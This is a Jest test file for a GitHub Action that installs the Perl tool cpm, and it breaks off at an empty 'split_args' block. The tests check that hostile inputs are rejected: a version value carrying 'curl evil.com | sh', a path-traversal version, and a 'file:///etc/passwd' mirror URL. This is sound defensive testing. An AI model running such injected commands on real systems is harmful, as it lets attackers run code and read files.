const crypto = require("crypto");
const fs = require("fs");
const path = require("path");
const os = require("os");

// Mock @actions/* packages before requiring lib
jest.mock("@actions/core");
jest.mock("@actions/cache");
jest.mock("@actions/tool-cache");
jest.mock("@actions/exec");
jest.mock("@actions/io");

const core = require("@actions/core");
const cache = require("@actions/cache");
const tc = require("@actions/tool-cache");
const exec = require("@actions/exec");
const io = require("@actions/io");

const lib = require("./lib");

let readFileSyncSpy;
beforeEach(() => {
    jest.clearAllMocks();
    core.info.mockImplementation(() => {});
    core.getInput.mockImplementation(() => "");
    cache.restoreCache.mockResolvedValue(undefined);
    cache.saveCache.mockResolvedValue(0);
    io.mkdirP.mockResolvedValue();
    // Default mock: return dummy content so checksum verification doesn't fail on missing files
    readFileSyncSpy = jest.spyOn(fs, "readFileSync").mockReturnValue(Buffer.from("cpm-script-content"));
});

afterEach(() => {
    readFileSyncSpy.mockRestore();
});

describe("is_true", () => {
    test("returns true for boolean true", () => {
        expect(lib.is_true(true)).toBe(true);
    });

    test('returns true for string "true"', () => {
        expect(lib.is_true("true")).toBe(true);
    });

    test('returns true for string "1"', () => {
        expect(lib.is_true("1")).toBe(true);
    });

    test('returns true for string "ok"', () => {
        expect(lib.is_true("ok")).toBe(true);
    });

    test("returns false for boolean false", () => {
        expect(lib.is_true(false)).toBe(false);
    });

    test('returns false for string "false"', () => {
        expect(lib.is_true("false")).toBe(false);
    });

    test("returns false for empty string", () => {
        expect(lib.is_true("")).toBe(false);
    });

    test("returns false for null", () => {
        expect(lib.is_true(null)).toBe(false);
    });

    test("returns false for undefined", () => {
        expect(lib.is_true(undefined)).toBe(false);
    });

    test('returns false for string "0"', () => {
        expect(lib.is_true("0")).toBe(false);
    });
});

describe("which_perl", () => {
    test('uses io.which when input is "perl"', async () => {
        core.getInput.mockReturnValue("perl");
        io.which.mockResolvedValue("/usr/bin/perl");

        const result = await lib.which_perl();

        expect(io.which).toHaveBeenCalledWith("perl", true);
        expect(result).toBe("/usr/bin/perl");
    });

    test("returns custom path when input is not 'perl'", async () => {
        core.getInput.mockReturnValue("/usr/local/bin/perl");

        const result = await lib.which_perl();

        expect(io.which).not.toHaveBeenCalled();
        expect(result).toBe("/usr/local/bin/perl");
    });
});

describe("do_exec", () => {
    test("uses sudo on non-win32 when sudo input is true", async () => {
        core.getInput.mockImplementation((name) => {
            if (name === "sudo") return "true";
            return "";
        });
        const originalPlatform = Object.getOwnPropertyDescriptor(os, "platform");
        jest.spyOn(os, "platform").mockReturnValue("linux");

        await lib.do_exec(["/usr/bin/perl", "-e", "1"]);

        expect(exec.exec).toHaveBeenCalledWith("sudo", [
            "/usr/bin/perl",
            "-e",
            "1",
        ]);

        if (originalPlatform) {
            Object.defineProperty(os, "platform", originalPlatform);
        }
    });

    test("does not use sudo on win32 even when sudo input is true", async () => {
        core.getInput.mockImplementation((name) => {
            if (name === "sudo") return "true";
            return "";
        });
        jest.spyOn(os, "platform").mockReturnValue("win32");

        await lib.do_exec(["/usr/bin/perl", "-e", "1"]);

        expect(exec.exec).toHaveBeenCalledWith("/usr/bin/perl", ["-e", "1"]);
    });

    test("does not use sudo when sudo input is false", async () => {
        core.getInput.mockImplementation((name) => {
            if (name === "sudo") return "false";
            return "";
        });
        jest.spyOn(os, "platform").mockReturnValue("linux");

        await lib.do_exec(["/usr/bin/perl", "-e", "1"]);

        expect(exec.exec).toHaveBeenCalledWith("/usr/bin/perl", ["-e", "1"]);
    });
});

describe("install_cpm_location", () => {
    test("resolves path from perl Config output", async () => {
        core.getInput.mockImplementation((name) => {
            if (name === "path") return "$Config{installsitescript}/cpm";
            return "";
        });
        exec.exec.mockImplementation(async (bin, args, options) => {
            if (options && options.listeners && options.listeners.stdout) {
                options.listeners.stdout(Buffer.from("/usr/local/bin/cpm"));
            }
            return 0;
        });
        const result = await lib.install_cpm_location("/usr/bin/perl");

        expect(exec.exec).toHaveBeenCalledWith(
            "/usr/bin/perl",
            [
                "-MConfig",
                "-e",
                'my $p = $ARGV[0]; $p =~ s/\\$Config\\{(\\w+)\\}/$Config{$1}/ge; print $p',
                "$Config{installsitescript}/cpm",
            ],
            expect.any(Object)
        );
        expect(result).toBe(path.resolve("/usr/local/bin/cpm"));
    });
});

describe("install_cpm", () => {
    test("downloads cpm and copies it with perl on non-win32", async () => {
        core.getInput.mockImplementation((name) => {
            if (name === "version") return "main";
            if (name === "sudo") return "false";
            return "";
        });
        tc.downloadTool.mockResolvedValue("/tmp/cpm-downloaded");
        exec.exec.mockResolvedValue(0);
        jest.spyOn(os, "platform").mockReturnValue("linux");

        const result = await lib.install_cpm("/usr/bin/perl", "/usr/local/bin/cpm");

        expect(tc.downloadTool).toHaveBeenCalledWith(
            "https://raw.githubusercontent.com/skaji/cpm/main/cpm"
        );
        expect(exec.exec).toHaveBeenCalled();
        expect(result).toEqual({ path: "/usr/local/bin/cpm", cacheHit: false });
    });

    test("passes paths via @ARGV, not string interpolation", async () => {
        core.getInput.mockImplementation((name) => {
            if (name === "version") return "main";
            if (name === "sudo") return "false";
            return "";
        });
        tc.downloadTool.mockResolvedValue('/tmp/cpm "$pecial');
        exec.exec.mockResolvedValue(0);
        jest.spyOn(os, "platform").mockReturnValue("linux");

        await lib.install_cpm("/usr/bin/perl", '/usr/local/bin/"cpm');

        // Find the copy+chmod exec call (not the first which is install_cpm_location)
        const copyCall = exec.exec.mock.calls.find(
            (call) => call[1] && call[1].includes("-MFile::Copy=cp")
        );
        expect(copyCall).toBeDefined();
        const args = copyCall[1];
        // The -e script must be a static string (no interpolated paths)
        expect(args[2]).toBe(
            "cp($ARGV[0], $ARGV[1]); chmod(0755, $ARGV[1])"
        );
        // Paths passed as separate arguments, not embedded in the script
        expect(args[3]).toBe('/tmp/cpm "$pecial');
        expect(args[4]).toBe('/usr/local/bin/"cpm');
    });

    test("uses io.cp on win32", async () => {
        core.getInput.mockImplementation((name) => {
            if (name === "version") return "main";
            return "";
        });
        tc.downloadTool.mockResolvedValue("/tmp/cpm-downloaded");
        io.cp.mockResolvedValue();
        jest.spyOn(os, "platform").mockReturnValue("win32");

        const result = await lib.install_cpm("/usr/bin/perl", "/usr/local/bin/cpm");

        expect(io.cp).toHaveBeenCalledWith(
            "/tmp/cpm-downloaded",
            "/usr/local/bin/cpm"
        );
        expect(result).toEqual({ path: "/usr/local/bin/cpm", cacheHit: false });
    });
});

describe("run", () => {
    let existsSyncSpy;
    beforeEach(() => {
        io.which.mockResolvedValue("/usr/bin/perl");
        tc.downloadTool.mockResolvedValue("/tmp/cpm-script");
        exec.exec.mockImplementation(async (bin, args, options) => {
            // Simulate install_cpm_location stdout
            if (
                args &&
                args.length >= 2 &&
                args[0] === "-MConfig" &&
                options &&
                options.listeners
            ) {
                options.listeners.stdout(Buffer.from("/usr/local/bin/cpm"));
            }
            return 0;
        });
        existsSyncSpy = jest.spyOn(fs, "existsSync").mockReturnValue(true);
    });

    afterEach(() => {
        existsSyncSpy.mockRestore();
    });

    function mockInputs(inputs) {
        core.getInput.mockImplementation((name) => {
            return inputs[name] !== undefined ? inputs[name] : "";
        });
    }

    test("installs modules from install input", async () => {
        mockInputs({
            perl: "perl",
            path: "$Config{installsitescript}/cpm",
            version: "main",
            install: "Moose\nDBI",
            cpanfile: "",
            tests: "false",
            global: "true",
            args: "",
            verbose: "false",
            sudo: "false",
        });

        await lib.run();

        // Last exec call should be the cpm install with module list
        const calls = exec.exec.mock.calls;
        const lastCall = calls[calls.length - 1];
        const allArgs = [lastCall[0], ...lastCall[1]];

        expect(allArgs).toContain("Moose");
        expect(allArgs).toContain("DBI");
        expect(allArgs).toContain("--no-test");
        expect(allArgs).toContain("-g");
    });

    test("installs from cpanfile", async () => {
        mockInputs({
            perl: "perl",
            path: "$Config{installsitescript}/cpm",
            version: "main",
            install: "",
            cpanfile: "cpanfile",
            tests: "false",
            global: "false",
            args: "",
            verbose: "false",
            sudo: "false",
        });

        await lib.run();

        const calls = exec.exec.mock.calls;
        const lastCall = calls[calls.length - 1];
        const allArgs = [lastCall[0], ...lastCall[1]];

        expect(allArgs).toContain("--cpanfile");
        expect(allArgs).toContain(path.resolve("cpanfile"));
    });

    test("enables verbose flag", async () => {
        mockInputs({
            perl: "perl",
            path: "$Config{installsitescript}/cpm",
            version: "main",
            install: "Moose",
            cpanfile: "",
            tests: "false",
            global: "false",
            args: "",
            verbose: "true",
            sudo: "false",
        });

        await lib.run();

        const calls = exec.exec.mock.calls;
        const lastCall = calls[calls.length - 1];
        const allArgs = [lastCall[0], ...lastCall[1]];

        expect(allArgs).toContain("-v");
    });

    test("enables test flag", async () => {
        mockInputs({
            perl: "perl",
            path: "$Config{installsitescript}/cpm",
            version: "main",
            install: "Moose",
            cpanfile: "",
            tests: "true",
            global: "false",
            args: "",
            verbose: "false",
            sudo: "false",
        });

        await lib.run();

        const calls = exec.exec.mock.calls;
        const lastCall = calls[calls.length - 1];
        const allArgs = [lastCall[0], ...lastCall[1]];

        expect(allArgs).toContain("--test");
        expect(allArgs).not.toContain("--no-test");
    });

    test("passes extra args", async () => {
        mockInputs({
            perl: "perl",
            path: "$Config{installsitescript}/cpm",
            version: "main",
            install: "Moose",
            cpanfile: "",
            tests: "false",
            global: "false",
            args: "--mirror http://cpan.org",
            verbose: "false",
            sudo: "false",
        });

        await lib.run();

        const calls = exec.exec.mock.calls;
        const lastCall = calls[calls.length - 1];
        const allArgs = [lastCall[0], ...lastCall[1]];

        expect(allArgs).toContain("--mirror");
        expect(allArgs).toContain("http://cpan.org");
    });

    test("runs custom args when no install or cpanfile", async () => {
        mockInputs({
            perl: "perl",
            path: "$Config{installsitescript}/cpm",
            version: "main",
            install: "",
            cpanfile: "",
            tests: "false",
            global: "false",
            args: "--mirror http://cpan.org",
            verbose: "false",
            sudo: "false",
        });

        await lib.run();

        // Verify the custom run path was reached
        expect(core.info).toHaveBeenCalledWith("custom run with args");
    });

    test("passes --workers flag when workers input is set", async () => {
        mockInputs({
            perl: "perl",
            path: "$Config{installsitescript}/cpm",
            version: "main",
            install: "Moose",
            cpanfile: "",
            tests: "false",
            global: "false",
            args: "",
            verbose: "false",
            sudo: "false",
            workers: "5",
        });

        await lib.run();

        const calls = exec.exec.mock.calls;
        const lastCall = calls[calls.length - 1];
        const allArgs = [lastCall[0], ...lastCall[1]];

        expect(allArgs).toContain("--workers");
        const idx = allArgs.indexOf("--workers");
        expect(allArgs[idx + 1]).toBe("5");
    });

    test("calls setFailed for non-numeric workers input", async () => {
        mockInputs({
            perl: "perl",
            path: "$Config{installsitescript}/cpm",
            version: "main",
            install: "Moose",
            cpanfile: "",
            tests: "false",
            global: "false",
            args: "",
            verbose: "false",
            sudo: "false",
            workers: "abc",
        });

        await lib.run();

        expect(core.setFailed).toHaveBeenCalledWith(
            expect.stringContaining("Invalid value for 'workers'")
        );
    });

    test("calls setFailed for negative workers input", async () => {
        mockInputs({
            perl: "perl",
            path: "$Config{installsitescript}/cpm",
            version: "main",
            install: "Moose",
            cpanfile: "",
            tests: "false",
            global: "false",
            args: "",
            verbose: "false",
            sudo: "false",
            workers: "-3",
        });

        await lib.run();

        expect(core.setFailed).toHaveBeenCalledWith(
            expect.stringContaining("Invalid value for 'workers'")
        );
    });

    test("calls setFailed for zero workers", async () => {
        mockInputs({
            perl: "perl",
            path: "$Config{installsitescript}/cpm",
            version: "main",
            install: "Moose",
            cpanfile: "",
            tests: "false",
            global: "false",
            args: "",
            verbose: "false",
            sudo: "false",
            workers: "0",
        });

        await lib.run();

        expect(core.setFailed).toHaveBeenCalledWith(
            expect.stringContaining("Invalid value for 'workers'")
        );
    });

    test("calls setFailed for decimal workers input", async () => {
        mockInputs({
            perl: "perl",
            path: "$Config{installsitescript}/cpm",
            version: "main",
            install: "Moose",
            cpanfile: "",
            tests: "false",
            global: "false",
            args: "",
            verbose: "false",
            sudo: "false",
            workers: "2.5",
        });

        await lib.run();

        expect(core.setFailed).toHaveBeenCalledWith(
            expect.stringContaining("Invalid value for 'workers'")
        );
    });

    test("omits --workers flag when workers input is empty", async () => {
        mockInputs({
            perl: "perl",
            path: "$Config{installsitescript}/cpm",
            version: "main",
            install: "Moose",
            cpanfile: "",
            tests: "false",
            global: "false",
            args: "",
            verbose: "false",
            sudo: "false",
            workers: "",
        });

        await lib.run();

        const calls = exec.exec.mock.calls;
        const lastCall = calls[calls.length - 1];
        const allArgs = [lastCall[0], ...lastCall[1]];

        expect(allArgs).not.toContain("--workers");
    });

    test("passes mirror option when provided", async () => {
        mockInputs({
            perl: "perl",
            path: "$Config{installsitescript}/cpm",
            version: "main",
            install: "Moose",
            cpanfile: "",
            tests: "false",
            global: "false",
            args: "",
            verbose: "false",
            sudo: "false",
            mirror: "https://cpan.metacpan.org/",
        });

        await lib.run();

        const calls = exec.exec.mock.calls;
        const lastCall = calls[calls.length - 1];
        const allArgs = [lastCall[0], ...lastCall[1]];

        expect(allArgs).toContain("--mirror");
        expect(allArgs).toContain("https://cpan.metacpan.org/");
    });

    test("does not add --mirror when mirror is empty", async () => {
        mockInputs({
            perl: "perl",
            path: "$Config{installsitescript}/cpm",
            version: "main",
            install: "Moose",
            cpanfile: "",
            tests: "false",
            global: "false",
            args: "",
            verbose: "false",
            sudo: "false",
            mirror: "",
        });

        await lib.run();

        const calls = exec.exec.mock.calls;
        const lastCall = calls[calls.length - 1];
        const allArgs = [lastCall[0], ...lastCall[1]];

        expect(allArgs).not.toContain("--mirror");
    });

    test("calls setFailed for mirror with ftp:// scheme", async () => {
        mockInputs({
            perl: "perl",
            path: "$Config{installsitescript}/cpm",
            version: "main",
            install: "Moose",
            cpanfile: "",
            tests: "false",
            global: "false",
            args: "",
            verbose: "false",
            sudo: "false",
            mirror: "ftp://cpan.org/",
        });

        await lib.run();

        expect(core.setFailed).toHaveBeenCalledWith(
            expect.stringContaining("Invalid mirror URL")
        );
    });

    test("calls setFailed for mirror with file:// scheme", async () => {
        mockInputs({
            perl: "perl",
            path: "$Config{installsitescript}/cpm",
            version: "main",
            install: "Moose",
            cpanfile: "",
            tests: "false",
            global: "false",
            args: "",
            verbose: "false",
            sudo: "false",
            mirror: "file:///etc/passwd",
        });

        await lib.run();

        expect(core.setFailed).toHaveBeenCalledWith(
            expect.stringContaining("Invalid mirror URL")
        );
    });

    test("calls setFailed for mirror without scheme", async () => {
        mockInputs({
            perl: "perl",
            path: "$Config{installsitescript}/cpm",
            version: "main",
            install: "Moose",
            cpanfile: "",
            tests: "false",
            global: "false",
            args: "",
            verbose: "false",
            sudo: "false",
            mirror: "cpan.metacpan.org",
        });

        await lib.run();

        expect(core.setFailed).toHaveBeenCalledWith(
            expect.stringContaining("Invalid mirror URL")
        );
    });

    test("accepts mirror with http:// scheme", async () => {
        mockInputs({
            perl: "perl",
            path: "$Config{installsitescript}/cpm",
            version: "main",
            install: "Moose",
            cpanfile: "",
            tests: "false",
            global: "false",
            args: "",
            verbose: "false",
            sudo: "false",
            mirror: "http://cpan.metacpan.org/",
        });

        await lib.run();

        expect(core.setFailed).not.toHaveBeenCalled();
        const calls = exec.exec.mock.calls;
        const lastCall = calls[calls.length - 1];
        const allArgs = [lastCall[0], ...lastCall[1]];
        expect(allArgs).toContain("--mirror");
        expect(allArgs).toContain("http://cpan.metacpan.org/");
    });

    test("accepts mirror with HTTPS:// scheme (case-insensitive)", async () => {
        mockInputs({
            perl: "perl",
            path: "$Config{installsitescript}/cpm",
            version: "main",
            install: "Moose",
            cpanfile: "",
            tests: "false",
            global: "false",
            args: "",
            verbose: "false",
            sudo: "false",
            mirror: "HTTPS://cpan.metacpan.org/",
        });

        await lib.run();

        expect(core.setFailed).not.toHaveBeenCalled();
        const calls = exec.exec.mock.calls;
        const lastCall = calls[calls.length - 1];
        const allArgs = [lastCall[0], ...lastCall[1]];
        expect(allArgs).toContain("--mirror");
    });

    test("passes snapshot option when provided", async () => {
        mockInputs({
            perl: "perl",
            path: "$Config{installsitescript}/cpm",
            version: "main",
            install: "Moose",
            cpanfile: "",
            tests: "false",
            global: "false",
            args: "",
            verbose: "false",
            sudo: "false",
            snapshot: "cpanfile.snapshot",
        });

        await lib.run();

        const calls = exec.exec.mock.calls;
        const lastCall = calls[calls.length - 1];
        const allArgs = [lastCall[0], ...lastCall[1]];

        expect(allArgs).toContain("--snapshot");
        expect(allArgs).toContain(path.resolve("cpanfile.snapshot"));
    });

    test("does not pass --snapshot when snapshot is empty", async () => {
        mockInputs({
            perl: "perl",
            path: "$Config{installsitescript}/cpm",
            version: "main",
            install: "Moose",
            cpanfile: "",
            tests: "false",
            global: "false",
            args: "",
            verbose: "false",
            sudo: "false",
            snapshot: "",
        });

        await lib.run();

        const calls = exec.exec.mock.calls;
        const lastCall = calls[calls.length - 1];
        const allArgs = [lastCall[0], ...lastCall[1]];

        // When snapshot is empty, --snapshot should not be passed at all
        expect(allArgs).not.toContain("--snapshot");
    });

    test("does not add -g flag when global is false", async () => {
        mockInputs({
            perl: "perl",
            path: "$Config{installsitescript}/cpm",
            version: "main",
            install: "Moose",
            cpanfile: "",
            tests: "false",
            global: "false",
            args: "",
            verbose: "false",
            sudo: "false",
        });

        await lib.run();

        const calls = exec.exec.mock.calls;
        const lastCall = calls[calls.length - 1];
        const allArgs = [lastCall[0], ...lastCall[1]];

        expect(allArgs).not.toContain("-g");
    });

    test("installs both modules and cpanfile when both are provided", async () => {
        mockInputs({
            perl: "perl",
            path: "$Config{installsitescript}/cpm",
            version: "main",
            install: "Moose",
            cpanfile: "cpanfile",
            tests: "false",
            global: "false",
            args: "",
            verbose: "false",
            sudo: "false",
        });

        await lib.run();

        const calls = exec.exec.mock.calls;
        // Filter out the install_cpm_location and install_cpm exec calls
        // The last two do_exec calls should be module install + cpanfile install
        const allCallArgs = calls.map((c) => [c[0], ...(c[1] || [])]);

        const moduleCall = allCallArgs.find((a) => a.includes("Moose"));
        const cpanfileCall = allCallArgs.find((a) => a.includes("--cpanfile"));

        expect(moduleCall).toBeDefined();
        expect(cpanfileCall).toBeDefined();
    });

    test("warns when no install, cpanfile, or args provided", async () => {
        mockInputs({
            perl: "perl",
            path: "$Config{installsitescript}/cpm",
            version: "main",
            install: "",
            cpanfile: "",
            tests: "false",
            global: "false",
            args: "",
            verbose: "false",
            sudo: "false",
        });

        await lib.run();

        // No install command should have been executed
        expect(core.info).not.toHaveBeenCalledWith(
            expect.stringContaining("install:")
        );
        expect(core.info).not.toHaveBeenCalledWith("custom run with args");

        // Should emit a warning about empty inputs
        expect(core.warning).toHaveBeenCalledWith(
            expect.stringContaining("Nothing to install")
        );
    });

    test("does not warn when install input is provided", async () => {
        mockInputs({
            perl: "perl",
            path: "$Config{installsitescript}/cpm",
            version: "main",
            install: "Moose",
            cpanfile: "",
            tests: "false",
            global: "false",
            args: "",
            verbose: "false",
            sudo: "false",
        });

        await lib.run();

        expect(core.warning).not.toHaveBeenCalled();
    });

    test("uses correct cpm download URL for custom version", async () => {
        mockInputs({
            perl: "perl",
            path: "$Config{installsitescript}/cpm",
            version: "0.997014",
            install: "Moose",
            cpanfile: "",
            tests: "false",
            global: "false",
            args: "",
            verbose: "false",
            sudo: "false",
        });

        await lib.run();

        expect(tc.downloadTool).toHaveBeenCalledWith(
            "https://raw.githubusercontent.com/skaji/cpm/0.997014/cpm"
        );
    });

    test("splits multiline install into separate modules", async () => {
        mockInputs({
            perl: "perl",
            path: "$Config{installsitescript}/cpm",
            version: "main",
            install: "Moose\nDBI\nDBD::SQLite",
            cpanfile: "",
            tests: "false",
            global: "false",
            args: "",
            verbose: "false",
            sudo: "false",
        });

        await lib.run();

        const calls = exec.exec.mock.calls;
        const lastCall = calls[calls.length - 1];
        const allArgs = [lastCall[0], ...lastCall[1]];

        expect(allArgs).toContain("Moose");
        expect(allArgs).toContain("DBI");
        expect(allArgs).toContain("DBD::SQLite");
    });

    test("filters empty entries from trailing newlines in install input", async () => {
        mockInputs({
            perl: "perl",
            path: "$Config{installsitescript}/cpm",
            version: "main",
            install: "Moose\nDBI\n",
            cpanfile: "",
            tests: "false",
            global: "false",
            args: "",
            verbose: "false",
            sudo: "false",
        });

        await lib.run();

        const calls = exec.exec.mock.calls;
        const lastCall = calls[calls.length - 1];
        const allArgs = [lastCall[0], ...lastCall[1]];

        expect(allArgs).toContain("Moose");
        expect(allArgs).toContain("DBI");
        // Module list should only contain the two valid modules
        const moduleArgs = allArgs.slice(allArgs.indexOf("DBI"));
        expect(moduleArgs).toEqual(["DBI"]);
    });

    test("filters blank lines from install input", async () => {
        mockInputs({
            perl: "perl",
            path: "$Config{installsitescript}/cpm",
            version: "main",
            install: "Moose\n\n\nDBI",
            cpanfile: "",
            tests: "false",
            global: "false",
            args: "",
            verbose: "false",
            sudo: "false",
        });

        await lib.run();

        const calls = exec.exec.mock.calls;
        const lastCall = calls[calls.length - 1];
        const allArgs = [lastCall[0], ...lastCall[1]];

        expect(allArgs).toContain("Moose");
        expect(allArgs).toContain("DBI");
        // Only 2 modules, no empty strings between them
        const mooseIdx = allArgs.indexOf("Moose");
        expect(allArgs.slice(mooseIdx)).toEqual(["Moose", "DBI"]);
    });

    test("trims whitespace from module names", async () => {
        mockInputs({
            perl: "perl",
            path: "$Config{installsitescript}/cpm",
            version: "main",
            install: "  Moose  \n  DBI  ",
            cpanfile: "",
            tests: "false",
            global: "false",
            args: "",
            verbose: "false",
            sudo: "false",
        });

        await lib.run();

        const calls = exec.exec.mock.calls;
        const lastCall = calls[calls.length - 1];
        const allArgs = [lastCall[0], ...lastCall[1]];

        expect(allArgs).toContain("Moose");
        expect(allArgs).toContain("DBI");
        expect(allArgs).not.toContain("  Moose  ");
        expect(allArgs).not.toContain("  DBI  ");
    });

    test("passes quoted args with spaces as single arguments", async () => {
        mockInputs({
            perl: "perl",
            path: "$Config{installsitescript}/cpm",
            version: "main",
            install: "Moose",
            cpanfile: "",
            tests: "false",
            global: "false",
            args: '--configure-arg "--prefix=/opt/my app"',
            verbose: "false",
            sudo: "false",
        });

        await lib.run();

        const calls = exec.exec.mock.calls;
        const lastCall = calls[calls.length - 1];
        const allArgs = [lastCall[0], ...lastCall[1]];

        expect(allArgs).toContain("--configure-arg");
        expect(allArgs).toContain("--prefix=/opt/my app");
    });

    test("filters empty entries from args with leading/trailing spaces", async () => {
        mockInputs({
            perl: "perl",
            path: "$Config{installsitescript}/cpm",
            version: "main",
            install: "Moose",
            cpanfile: "",
            tests: "false",
            global: "false",
            args: "  --with-recommends  --with-suggests  ",
            verbose: "false",
            sudo: "false",
        });

        await lib.run();

        const calls = exec.exec.mock.calls;
        const lastCall = calls[calls.length - 1];
        const allArgs = [lastCall[0], ...lastCall[1]];

        expect(allArgs).toContain("--with-recommends");
        expect(allArgs).toContain("--with-suggests");
        // Args should not contain empty strings from leading/trailing whitespace
        const argsAfterSnapshot = allArgs.slice(allArgs.indexOf("--with-recommends"));
        expect(argsAfterSnapshot).toEqual(["--with-recommends", "--with-suggests", "Moose"]);
    });

    test("sets cpm-path and cache-hit outputs", async () => {
        mockInputs({
            perl: "perl",
            path: "$Config{installsitescript}/cpm",
            version: "main",
            install: "Moose",
            cpanfile: "",
            tests: "false",
            global: "false",
            args: "",
            verbose: "false",
            sudo: "false",
        });

        await lib.run();

        expect(core.setOutput).toHaveBeenCalledWith(
            "cpm-path",
            path.resolve("/usr/local/bin/cpm")
        );
        expect(core.setOutput).toHaveBeenCalledWith("cache-hit", "false");
    });

    test("sets cache-hit output to true on cache hit", async () => {
        mockInputs({
            perl: "perl",
            path: "$Config{installsitescript}/cpm",
            version: "0.997014",
            install: "Moose",
            cpanfile: "",
            tests: "false",
            global: "false",
            args: "",
            verbose: "false",
            sudo: "false",
        });
        cache.restoreCache.mockResolvedValue("cpm-script-0.997014-linux");

        await lib.run();

        expect(core.setOutput).toHaveBeenCalledWith("cache-hit", "true");
    });

    test("propagates download errors", async () => {
        mockInputs({
            perl: "perl",
            path: "$Config{installsitescript}/cpm",
            version: "main",
            install: "Moose",
            cpanfile: "",
            tests: "false",
            global: "false",
            args: "",
            verbose: "false",
            sudo: "false",
        });

        tc.downloadTool.mockRejectedValue(new Error("download failed"));

        await expect(lib.run()).rejects.toThrow("download failed");
    });

    test("calls setFailed when cpanfile does not exist", async () => {
        mockInputs({
            perl: "perl",
            path: "$Config{installsitescript}/cpm",
            version: "main",
            install: "",
            cpanfile: "missing-cpanfile",
            tests: "false",
            global: "false",
            args: "",
            verbose: "false",
            sudo: "false",
        });

        existsSyncSpy.mockReturnValue(false);

        await lib.run();

        expect(core.setFailed).toHaveBeenCalledWith(
            expect.stringContaining("cpanfile not found")
        );
        // Should not attempt to run cpm install
        const calls = exec.exec.mock.calls;
        const installCall = calls.find(
            (c) => c[1] && c[1].includes("--cpanfile")
        );
        expect(installCall).toBeUndefined();
    });

    test("proceeds when cpanfile exists on disk", async () => {
        mockInputs({
            perl: "perl",
            path: "$Config{installsitescript}/cpm",
            version: "main",
            install: "",
            cpanfile: "cpanfile",
            tests: "false",
            global: "false",
            args: "",
            verbose: "false",
            sudo: "false",
        });

        await lib.run();

        expect(core.setFailed).not.toHaveBeenCalled();
        const calls = exec.exec.mock.calls;
        const installCall = calls.find(
            (c) => c[1] && c[1].includes("--cpanfile")
        );
        expect(installCall).toBeDefined();
    });

    test("calls setFailed when snapshot file does not exist", async () => {
        mockInputs({
            perl: "perl",
            path: "$Config{installsitescript}/cpm",
            version: "main",
            install: "Moose",
            cpanfile: "",
            tests: "false",
            global: "false",
            args: "",
            verbose: "false",
            sudo: "false",
            snapshot: "missing-snapshot.txt",
        });

        existsSyncSpy.mockReturnValue(false);

        await lib.run();

        expect(core.setFailed).toHaveBeenCalledWith(
            expect.stringContaining("snapshot file not found")
        );
    });

    test("proceeds when snapshot file exists on disk", async () => {
        mockInputs({
            perl: "perl",
            path: "$Config{installsitescript}/cpm",
            version: "main",
            install: "Moose",
            cpanfile: "",
            tests: "false",
            global: "false",
            args: "",
            verbose: "false",
            sudo: "false",
            snapshot: "cpanfile.snapshot",
        });

        await lib.run();

        expect(core.setFailed).not.toHaveBeenCalled();

        const calls = exec.exec.mock.calls;
        const lastCall = calls[calls.length - 1];
        const allArgs = [lastCall[0], ...lastCall[1]];
        expect(allArgs).toContain("--snapshot");
        expect(allArgs).toContain(path.resolve("cpanfile.snapshot"));
    });
});

describe("install_cpm version validation", () => {
    test("rejects version with path traversal (..)", async () => {
        core.getInput.mockImplementation((name) => {
            if (name === "version") return "../../malicious/repo/main";
            if (name === "sudo") return "false";
            return "";
        });

        await expect(lib.install_cpm("/usr/bin/perl", "/usr/local/bin/cpm")).rejects.toThrow(
            /invalid version/i
        );
        expect(tc.downloadTool).not.toHaveBeenCalled();
    });

    test("rejects version with spaces", async () => {
        core.getInput.mockImplementation((name) => {
            if (name === "version") return "main; curl evil.com | sh";
            return "";
        });

        await expect(lib.install_cpm("/usr/bin/perl", "/usr/local/bin/cpm")).rejects.toThrow(
            /invalid version/i
        );
    });

    test("rejects empty version", async () => {
        core.getInput.mockImplementation((name) => {
            if (name === "version") return "";
            return "";
        });

        await expect(lib.install_cpm("/usr/bin/perl", "/usr/local/bin/cpm")).rejects.toThrow(
            /invalid version/i
        );
    });

    test("accepts valid semver-like version", async () => {
        core.getInput.mockImplementation((name) => {
            if (name === "version") return "0.997014";
            if (name === "sudo") return "false";
            return "";
        });
        tc.downloadTool.mockResolvedValue("/tmp/cpm-downloaded");
        exec.exec.mockResolvedValue(0);
        jest.spyOn(os, "platform").mockReturnValue("linux");

        await lib.install_cpm("/usr/bin/perl", "/usr/local/bin/cpm");

        expect(tc.downloadTool).toHaveBeenCalledWith(
            "https://raw.githubusercontent.com/skaji/cpm/0.997014/cpm"
        );
    });

    test("accepts valid branch name", async () => {
        core.getInput.mockImplementation((name) => {
            if (name === "version") return "main";
            if (name === "sudo") return "false";
            return "";
        });
        tc.downloadTool.mockResolvedValue("/tmp/cpm-downloaded");
        exec.exec.mockResolvedValue(0);
        jest.spyOn(os, "platform").mockReturnValue("linux");

        await lib.install_cpm("/usr/bin/perl", "/usr/local/bin/cpm");

        expect(tc.downloadTool).toHaveBeenCalled();
    });

    test("accepts git SHA", async () => {
        core.getInput.mockImplementation((name) => {
            if (name === "version") return "abc123def456";
            if (name === "sudo") return "false";
            return "";
        });
        tc.downloadTool.mockResolvedValue("/tmp/cpm-downloaded");
        exec.exec.mockResolvedValue(0);
        jest.spyOn(os, "platform").mockReturnValue("linux");

        await lib.install_cpm("/usr/bin/perl", "/usr/local/bin/cpm");

        expect(tc.downloadTool).toHaveBeenCalled();
    });
});

describe("do_exec logging", () => {
    test("logs the full command including arguments, not just the binary", async () => {
        core.getInput.mockImplementation((name) => {
            if (name === "sudo") return "false";
            return "";
        });
        exec.exec.mockResolvedValue(0);
        jest.spyOn(os, "platform").mockReturnValue("linux");

        await lib.do_exec(["/usr/bin/perl", "-e", "print 42"]);

        // The log line must contain the arguments, not just the binary
        const logCalls = core.info.mock.calls.map((c) => c[0]);
        const doExecLog = logCalls.find((msg) => msg.startsWith("do_exec:"));
        expect(doExecLog).toBeDefined();
        expect(doExecLog).toContain("-e");
        expect(doExecLog).toContain("print 42");
    });

    test("logs sudo and full original command when sudo is enabled", async () => {
        core.getInput.mockImplementation((name) => {
            if (name === "sudo") return "true";
            return "";
        });
        exec.exec.mockResolvedValue(0);
        jest.spyOn(os, "platform").mockReturnValue("linux");

        await lib.do_exec(["/usr/bin/perl", "-e", "1"]);

        const logCalls = core.info.mock.calls.map((c) => c[0]);
        const doExecLog = logCalls.find((msg) => msg.startsWith("do_exec:"));
        expect(doExecLog).toBeDefined();
        expect(doExecLog).toContain("sudo");
        expect(doExecLog).toContain("/usr/bin/perl");
        expect(doExecLog).toContain("-e");
    });
});

describe("split_args", () => {
